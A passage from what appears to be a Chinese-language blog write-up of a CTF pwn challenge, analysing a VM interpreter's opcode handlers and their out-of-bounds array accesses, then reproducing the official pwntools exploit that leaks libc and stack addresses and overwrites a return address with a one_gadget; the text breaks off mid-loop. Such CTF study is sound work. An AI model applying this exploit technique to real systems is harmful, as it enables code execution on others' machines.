class="built_in">puts</span>(<span class="string">&quot;[+] MVA is shutting down ...&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>好看一点了</p>
<p><strong>入侵思路</strong></p>
<p>说实话有点搞，但是还是只能一步步分析每个“case”的作用，以及可能的漏洞：</p>
<ul>
<li>case0：终止循环</li>
<li>case1：赋值v10为“enc_num”</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTE2(x)   SBYTEn(x,  2) <span class="comment">/* 右移16位然后取低8位 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBYTEn(x, n)   (*((int8*)&amp;(x)+n)) <span class="comment">/* 取(地址+2)的内容-第3字节 */</span></span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_8; <span class="comment">/* exit */</span></span><br><span class="line">          *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = enc_num; <span class="comment">/* 感觉v10有点溢出 */</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* 在(v10+SBYTE2(enc_num))的位置写入enc_num */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>case2：对v10进行加操作（后面的代码都是类似的）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">  <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">char</span>)enc_num &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x80</span>u) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = *((_WORD *)&amp;v10 + SBYTE1(enc_num)) + *((_WORD *)&amp;v10 + (<span class="keyword">char</span>)enc_num); </span><br><span class="line">  <span class="keyword">goto</span> LABEL_102;</span><br></pre></td></tr></table></figure>
<ul>
<li>case3：对v10进行减操作</li>
<li>case4：对v10进行与操作</li>
<li>case5：对v10进行或操作</li>
<li>case6：对v10进行位移操作</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">  <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = (<span class="keyword">int</span>)*((<span class="keyword">unsigned</span> __int16 *)&amp;v10 + SBYTE2(enc_num)) &gt;&gt; *((_WORD *)&amp;v10 + SBYTE1(enc_num));</span><br><span class="line">  <span class="keyword">goto</span> LABEL_102;</span><br></pre></td></tr></table></figure>
<ul>
<li>case7：对v10进行异或操作</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">7u</span>:                              </span><br><span class="line">  <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">char</span>)enc_num &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x80</span>u) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = *((_WORD *)&amp;v10 + SBYTE1(enc_num)) ^ *((_WORD *)&amp;v10 + (<span class="keyword">char</span>)enc_num);</span><br><span class="line">  <span class="keyword">goto</span> LABEL_102;</span><br></pre></td></tr></table></figure>
<ul>
<li>case8：乱码，只能看汇编</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000001780</span> loc_1780:                               ; DATA XREF: .rodata:jpt_13D6↓o</span><br><span class="line">.text:<span class="number">0000000000001780</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000001785</span>                 call    enc</span><br><span class="line">.text:<span class="number">000000000000178</span>A                 mov     [rbp+var_234], eax</span><br><span class="line">.text:<span class="number">0000000000001790</span>                 mov     eax, [rbp+var_234]</span><br><span class="line">.text:<span class="number">0000000000001796</span>                 mov     cs:index, eax</span><br><span class="line">.text:<span class="number">000000000000179</span>C                 jmp     loc_1A2B</span><br></pre></td></tr></table></figure>
<ul>
<li>case9：把v10赋值给v12</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 v9; <span class="comment">// [rsp+30h] [rbp-230h] /* 数组负溢出 */</span></span><br><span class="line">__int16 v12[<span class="number">260</span>]; <span class="comment">// [rsp+50h] [rbp-210h]</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">9u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( v9 &gt; <span class="number">256</span> )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( BYTE2(enc_num) )</span><br><span class="line">            v12[v9] = enc_num;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            v12[v9] = v10;</span><br><span class="line">          ++v9;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_102;</span><br></pre></td></tr></table></figure>
<ul>
<li>case10：把v12赋值给v10</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0xA</span>u:</span><br><span class="line">  <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = v12[--v9];</span><br><span class="line">  <span class="keyword">goto</span> LABEL_102;</span><br></pre></td></tr></table></figure>
<ul>
<li>case11：再次执行“enc”，重置index</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0xB</span>u:</span><br><span class="line">  v8 = enc();</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">    index = v8;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_102;</span><br></pre></td></tr></table></figure>
<ul>
<li>case12：比较</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0xC</span>u:                             </span><br><span class="line">  <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x8000</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v4 = *((_WORD *)&amp;v10 + SBYTE2(enc_num)) == *((_WORD *)&amp;v10 + SBYTE1(enc_num));</span><br><span class="line">  <span class="keyword">goto</span> LABEL_102;</span><br></pre></td></tr></table></figure>
<ul>
<li>case13：对v10进行乘操作</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0xD</span>u:                             </span><br><span class="line">  <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">char</span>)enc_num &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x80</span>u) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  *((_WORD *)&amp;v10 + SBYTE2(enc_num)) = *((_WORD *)&amp;v10 + SBYTE1(enc_num)) * *((_WORD *)&amp;v10 + (<span class="keyword">char</span>)enc_num);</span><br><span class="line">  <span class="keyword">goto</span> LABEL_102;</span><br></pre></td></tr></table></figure>
<ul>
<li>case14：赋值v10</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0xE</span>u:</span><br><span class="line">  <span class="keyword">if</span> ( SBYTE2(enc_num) &gt; <span class="number">5</span> || (enc_num &amp; <span class="number">0x800000</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( SBYTE1(enc_num) &gt; <span class="number">5</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  *((_WORD *)&amp;v10 + SBYTE1(enc_num)) = *((_WORD *)&amp;v10 + SBYTE2(enc_num));</span><br><span class="line">  <span class="keyword">goto</span> LABEL_102;</span><br></pre></td></tr></table></figure>
<ul>
<li>case15：打印v12</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0xF</span>u:</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="keyword">unsigned</span> __int16)v12[v9]);</span><br><span class="line">  <span class="keyword">goto</span> LABEL_102;</span><br></pre></td></tr></table></figure>
<p>分析：首先这个“case15”一定是用来 leak libc_base 的（可能是：利用case9把v10赋值给v12，然后利用case15来打印v12）</p>
<p>在此之前还必须思考一下函数“enc”的逻辑以生成合适的“key”，程序原本的代码为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HIBYTE(x)   (*((_BYTE*)&amp;(x)+1)) <span class="comment">/* 让一个4字节的数据,保留第2个字节 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">__int64 <span class="title">enc</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> key; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  key = (*(_DWORD *)((<span class="keyword">char</span> *)&amp;code + index) &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xFF0000</span> | (*(_DWORD *)((<span class="keyword">char</span> *)&amp;code + index) &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00</span> | HIBYTE(*(_DWORD *)((<span class="keyword">char</span> *)&amp;code + index)) | (*(_DWORD *)((<span class="keyword">char</span> *)&amp;code + index) &lt;&lt; <span class="number">24</span>);</span><br><span class="line">  index += <span class="number">4</span>; <span class="comment">/* 每次操作4字节 */</span></span><br><span class="line">  <span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用 python 进行简化处理：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="number">9</span> <span class="comment"># input(4byte)</span></span><br><span class="line">enc_num = ((code &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xFF0000</span>) | ((code &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00</span>) | ((code &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>)| ((code &lt;&lt; <span class="number">24</span>) &amp; <span class="number">0xff000000</span>)</span><br><span class="line">key=(enc_num &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;enc_num=&quot;</span>+<span class="built_in">str</span>(enc_num))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;key=&quot;</span>+<span class="built_in">str</span>(key))</span><br></pre></td></tr></table></figure>
<p>经过多轮测试：4字节“input”的最后1字节就是“key”（解决了“key”的问题，还有很多谜团，程序有意把4字节的code按照地址高低分为4部分，我不知道为什么）</p>
<p>我觉得我到此为止了，目前还有以下几个问题需要解决：</p>
<ul>
<li>控制v12进行打印（leak libc_base and pro_base）</li>
<li>最终的入侵手段（hook or ret-system）</li>
<li>漏洞利用点（我勉强能分析清楚程序的意思，但利用点就不清楚了）</li>
</ul>
<p><strong>复现官方wp</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack</span>(<span class="params">op:<span class="built_in">int</span>, p1:<span class="built_in">int</span> = <span class="number">0</span>, p2:<span class="built_in">int</span> = <span class="number">0</span>, p3:<span class="built_in">int</span> = <span class="number">0</span></span>) -&gt; <span class="built_in">bytes</span>:</span></span><br><span class="line">   <span class="keyword">return</span> (op&amp;<span class="number">0xff</span>).to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>) + \</span><br><span class="line">          (p1&amp;<span class="number">0xff</span>).to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>) + \</span><br><span class="line">          (p2&amp;<span class="number">0xff</span>).to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>) + \</span><br><span class="line">          (p3&amp;<span class="number">0xff</span>).to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ldr</span>(<span class="params">val</span>):</span> <span class="comment"># v10=p1(offset1)~p2(offset2)~p3(offset3)</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x01</span>, <span class="number">0</span>, val &gt;&gt; <span class="number">8</span>, val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p1, p2, p3</span>):</span> <span class="comment"># *(&amp;v10+p1)=*(&amp;v10+p2) + *(&amp;v10+p3)</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x02</span>, p1, p2, p3)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub</span>(<span class="params">p1, p2, p3</span>):</span> <span class="comment"># *(&amp;v10+p1)=*(&amp;v10+p2) - *(&amp;v10+p3)</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x03</span>, p1, p2, p3)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shr</span>(<span class="params">p1, p2</span>):</span> <span class="comment"># *(&amp;v10+p1)=*(&amp;v10+p1) &gt;&gt; *(&amp;v10+p2)</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x06</span>, p1, p2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">p1, p2, p3</span>):</span> <span class="comment"># *(&amp;v10+p1)=*(&amp;v10+p2) ^ *(&amp;v10+p3)</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x07</span>, p1, p2, p3)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">push</span>():</span> <span class="comment"># v12=v10(ban &quot;v12=*(&amp;v10+p1)&quot;)</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x09</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pop</span>(<span class="params">p1</span>):</span> <span class="comment"># *(&amp;v10+p1)=v12</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x0a</span>, p1)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">p1, p2, p3</span>):</span> <span class="comment"># *(&amp;v10+p1)=*(&amp;v10+p2) * *(&amp;v10+p3)</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x0D</span>, p1, p2, p3)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mv</span>(<span class="params">p1, p2</span>):</span> <span class="comment"># *(&amp;v10+p2) = *(&amp;v10+p1)</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x0E</span>, p1, p2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sh</span>():</span> <span class="comment"># show</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x0F</span>)</span><br><span class="line"></span><br><span class="line">puts_offset = <span class="number">0x845ca</span></span><br><span class="line">puts_leak = (<span class="number">0x38</span> + <span class="number">0x268</span> - <span class="number">0x224</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">onegadgetlst = [<span class="number">0xe3b2e</span>, <span class="number">0xe3b31</span>, <span class="number">0xe3b34</span>]</span><br><span class="line">onegadget = onegadgetlst[<span class="number">0</span>]</span><br><span class="line">toadd = onegadget - puts_offset</span><br><span class="line">stack_leak = (<span class="number">0x268</span> - <span class="number">0x224</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">stack_pointer_leak = (<span class="number">0x238</span> - <span class="number">0x224</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">tosub = <span class="number">0x1a799e</span> + <span class="number">0x308</span></span><br><span class="line"><span class="comment"># tosub = 0x1a399e + 0x308   # debug aslr</span></span><br><span class="line">tosub = tosub - <span class="number">0x3000</span>  <span class="comment"># no aslr : player environment</span></span><br><span class="line">tosub = tosub - <span class="number">0x4000</span>  <span class="comment"># aslr : player environment</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># - 0x308 + stack_leak - puts + 0x1a799e</span></span><br><span class="line">pay = ldr(<span class="number">0x1</span>)</span><br><span class="line">pay += mv(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">pay += ldr(tosub&amp;<span class="number">0xffff</span>)</span><br><span class="line">pay += mv(<span class="number">0</span>,<span class="number">3</span>)</span><br><span class="line">pay += mul(<span class="number">4</span>,-puts_leak,<span class="number">1</span>)</span><br><span class="line">pay += mul(<span class="number">5</span>,-stack_leak,<span class="number">1</span>)</span><br><span class="line">pay += sub(<span class="number">0</span>,<span class="number">5</span>,<span class="number">4</span>)</span><br><span class="line">pay += sub(<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>)</span><br><span class="line">pay += shr(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">pay += push()</span><br><span class="line"></span><br><span class="line">pay += ldr((tosub&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)</span><br><span class="line">pay += mv(<span class="number">0</span>,<span class="number">3</span>)</span><br><span class="line">pay += mul(<span class="number">4</span>,-puts_leak+<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">pay += mul(<span class="number">5</span>,-stack_leak+<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">pay += sub(<span class="number">0</span>,<span class="number">5</span>,<span class="number">4</span>)</span><br><span class="line">pay += sub(<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>)</span><br><span class="line">pay += shr(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">pay += push()</span><br><span class="line"></span><br><span class="line"><span class="comment"># onegadget</span></span><br><span class="line">pay += mul(<span class="number">3</span>,-puts_leak,<span class="number">1</span>)</span><br><span class="line">pay += mul(<span class="number">4</span>,-puts_leak+<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">pay += ldr(toadd&amp;<span class="number">0xffff</span>)</span><br><span class="line">pay += add(<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>)</span><br><span class="line">pay += push()</span><br><span class="line">pay += ldr(((toadd&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)+<span class="number">1</span>)</span><br><span class="line">pay += add(<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line">pay += push()</span><br><span class="line">pay += mul(<span class="number">0</span>,-puts_leak+<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">pay += push()</span><br><span class="line">pay += pop(<span class="number">3</span>)</span><br><span class="line">pay += pop(<span class="number">4</span>)</span><br><span class="line">pay += pop(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">pay += pop(<span class="number">1</span>)</span><br><span class="line">pay += pop(<span class="number">2</span>)</span><br><span class="line">pay += ldr(<span class="number">0xffff</span>)</span><br><span class="line">pay += xor(<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">pay += ldr(<span class="number">1</span>)</span><br><span class="line">pay += add(<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">pay += mv(<span class="number">2</span>,-stack_pointer_leak)</span><br><span class="line">pay += ldr(<span class="number">0xffff</span>)</span><br><span class="line">pay += xor(<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">pay += mv(<span class="number">1</span>,-stack_pointer_leak+<span class="number">1</span>)</span><br><span class="line">pay += mv(<span class="number">0</span>,-stack_pointer_leak+<span class="number">2</span>)</span><br><span class="line">pay += mv(<span class="number">0</span>,-stack_pointer_leak+<span class="number">3</span>)</span><br><span class="line">pay += mv(<span class="number">5</span>,<span class="number">0</span>)</span><br><span class="line">pay += push()</span><br><span class="line">pay += mv(<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line">pay += push()</span><br><span class="line">pay += mv(<span class="number">3</span>,<span class="number">0</span>)</span><br><span class="line">pay += push()</span><br><span class="line">pay += ldr(<span class="number">0</span>)</span><br><span class="line">pay += push()</span><br><span class="line"></span><br><span class="line">pay += sh()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(pay)))</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(pay) &lt;= <span class="number">0x100</span></span><br><span class="line">pay = pay.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chance of this exp : about 1230 - 10125 times with 1 flag</span></span><br><span class="line"><span class="comment"># I admit this is an awful exp</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   p=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">   p.sendafter(<span class="string">&#x27;\n&#x27;</span>,pay)</span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">       p.recvuntil(<span class="string">&#x27;starting 